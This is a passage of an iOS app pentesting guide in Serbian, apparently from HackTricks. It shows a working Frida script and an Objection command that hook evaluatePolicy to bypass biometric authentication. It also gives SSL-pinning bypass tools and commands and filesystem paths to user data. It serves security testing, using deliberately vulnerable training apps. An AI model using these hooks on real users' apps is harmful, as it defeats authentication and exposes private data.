### Bypass okvira za lokalnu autentikaciju

#### **Prigovor**

Putem **Objection Biometrics Bypass**, koji se nalazi na [ovoj GitHub stranici](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), dostupna je tehnika za prevazilaÅ¾enje mehanizma **LocalAuthentication**. SrÅ¾ ovog pristupa ukljuÄuje koriÅ¡Ä‡enje **Fride** za manipulaciju funkcije `evaluatePolicy`, osiguravajuÄ‡i da uvek daje rezultat `True`, bez obzira na stvarni uspeh autentikacije. Ovo je posebno korisno za zaobilaÅ¾enje nesavrÅ¡enih biometrijskih autentikacionih procesa.

Za aktiviranje ovog zaobilaza, koristi se sledeÄ‡a komanda:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Ova komanda pokreÄ‡e sekvencu u kojoj Objection registruje zadatak koji efikasno menja ishod provere `evaluatePolicy` na `True`.

#### Frida

Primer koriÅ¡Ä‡enja **`evaluatePolicy`** iz [DVIA-v2 aplikacije](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Za postizanje **bypass**-a lokalne autentikacije, napisan je Frida skript. Ovaj skript cilja proveru **evaluatePolicy**, presreÄ‡uÄ‡i njen povratni poziv kako bi se osiguralo da vraÄ‡a **success=1**. Menjanjem ponaÅ¡anja povratnog poziva, provera autentikacije efikasno se zaobilazi.

Skript ispod je ubaÄen kako bi modifikovao rezultat metode **evaluatePolicy**. Menja rezultat povratnog poziva kako bi uvek pokazivao uspeh.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Da biste ubacili Frida skriptu i zaobiÅ¡li biometrijsku autentikaciju, koristi se sledeÄ‡a komanda:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Otkrivanje Osetljive Funkcionalnosti Putem IPC

### PrilagoÄ‘eni URI rukovaoci / Duboki linkovi / PrilagoÄ‘ene Å¡eme

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Univerzalni Linkovi

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Deljenje UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### ProÅ¡irenja Aplikacije

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebView-ovi

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serijalizacija i Kodiranje

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Komunikacija MreÅ¾e

VaÅ¾no je proveriti da li se neka komunikacija odvija **bez enkripcije** i takoÄ‘e da li aplikacija pravilno **validira TLS sertifikat** servera.\
Da biste proverili ovakve probleme, moÅ¾ete koristiti proxy poput **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Provera Hostname-a

Jedan uobiÄajeni problem prilikom validacije TLS sertifikata je provera da li je sertifikat potpisan od strane **pouzdanog** **CA**, ali **ne proverava** da li je **hostname** sertifikata hostname koji se pristupa.\
Da biste proverili ovaj problem koristeÄ‡i Burp, nakon Å¡to poverite Burp CA na iPhone-u, moÅ¾ete **kreirati novi sertifikat sa Burp-om za drugi hostname** i koristiti ga. Ako aplikacija i dalje radi, onda je neÅ¡to ranjivo.

### Pinovanje Sertifikata

Ako aplikacija pravilno koristi SSL Pinovanje, tada Ä‡e aplikacija raditi samo ako je sertifikat onaj koji se oÄekuje. Prilikom testiranja aplikacije **ovo moÅ¾e biti problem jer Ä‡e Burp posluÅ¾iti svoj sertifikat.**\
Da biste zaobiÅ¡li ovu zaÅ¡titu unutar jailbroken ureÄ‘aja, moÅ¾ete instalirati aplikaciju [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ili instalirati [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

TakoÄ‘e moÅ¾ete koristiti `ios sslpinning disable` iz **objection-a**.

## Razno

* U **`/System/Library`** moÅ¾ete pronaÄ‡i okvire instalirane u telefonu koje koriste sistemski programi
* Aplikacije instalirane od strane korisnika iz App Store-a se nalaze unutar **`/User/Applications`**
* A **`/User/Library`** sadrÅ¾i podatke saÄuvane od strane aplikacija na nivou korisnika
* MoÅ¾ete pristupiti **`/User/Library/Notes/notes.sqlite`** da biste proÄitali beleÅ¡ke saÄuvane unutar aplikacije.
* Unutar fascikle instalirane aplikacije (**`/User/Applications/<APP ID>/`**) moÅ¾ete pronaÄ‡i neke zanimljive datoteke:
  * **`iTunesArtwork`**: Ikona koju koristi aplikacija
  * **`iTunesMetadata.plist`**: Informacije o aplikaciji koriÅ¡Ä‡ene u App Store-u
  * **`/Library/*`**: SadrÅ¾i postavke i keÅ¡. U **`/Library/Cache/Snapshots/*`** moÅ¾ete pronaÄ‡i snimak izvrÅ¡en aplikaciji pre nego Å¡to je poslata u pozadinu.

### VruÄ‡e Popravljanje/AÅ¾uriranje

Programeri mogu daljinski **popraviti sve instalacije svoje aplikacije odmah** bez potrebe da ponovo podnose aplikaciju App Store-u i Äekaju odobrenje.\
Za tu svrhu se obiÄno koristi [**JSPatch**](https://github.com/bang590/JSPatch)**.** Ali postoje i druge opcije kao Å¡to su [Siren](https://github.com/ArtSabintsev/Siren) i [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Ovo je opasan mehanizam koji bi mogao biti zloupotrebljen od strane zlonamernih SDK-ova, stoga se preporuÄuje proveriti koji metod se koristi za automatsko aÅ¾uriranje (ako postoji) i testirati ga.** MoÅ¾ete pokuÅ¡ati da preuzmete prethodnu verziju aplikacije u tu svrhu.

### TreÄ‡e Strane

ZnaÄajan izazov sa **SDK-ovima treÄ‡ih strana** je **nedostatak granularne kontrole** nad njihovim funkcionalnostima. Programeri se suoÄavaju sa izborom: ili integriÅ¡u SDK i prihvataju sve njegove funkcije, ukljuÄujuÄ‡i potencijalne sigurnosne ranjivosti i probleme privatnosti, ili potpuno odustaju od njegovih prednosti. ÄŒesto, programeri nisu u moguÄ‡nosti da zakrpe ranjivosti unutar ovih SDK-ova sami. Å taviÅ¡e, kako SDK-ovi stiÄu poverenje u zajednici, neki od njih mogu poÄeti da sadrÅ¾e zlonamerni softver.

Usluge koje pruÅ¾aju SDK-ovi treÄ‡ih strana mogu ukljuÄivati praÄ‡enje ponaÅ¡anja korisnika, prikazivanje reklama ili poboljÅ¡anja korisniÄkog iskustva. MeÄ‘utim, to uvodi rizik jer programeri moÅ¾da nisu potpuno svesni koda koji se izvrÅ¡ava u ovim bibliotekama, Å¡to dovodi do potencijalnih rizika po privatnost i sigurnost. Od suÅ¡tinskog je znaÄaja ograniÄiti informacije koje se dele sa uslugama treÄ‡ih strana na ono Å¡to je neophodno i osigurati da osetljivi podaci nisu izloÅ¾eni.

Implementacija usluga treÄ‡ih strana obiÄno dolazi u dva oblika: samostalna biblioteka ili potpuni SDK. Da bi se zaÅ¡titila privatnost korisnika, svi podaci podeljeni sa ovim uslugama trebalo bi da budu **anonimizovani** kako bi se spreÄilo otkrivanje liÄno identifikacionih informacija (PII).

Da bi se identifikovale biblioteke koje aplikacija koristi, moÅ¾e se koristiti komanda **`otool`**. Ovaj alat treba pokrenuti protiv aplikacije i svake deljene biblioteke koje koristi kako bi se otkrile dodatne biblioteke.
```bash
otool -L <application_path>
```
## **Reference & Dodatni Resursi**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS besplatni kurs([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C verzija [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift verzija
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
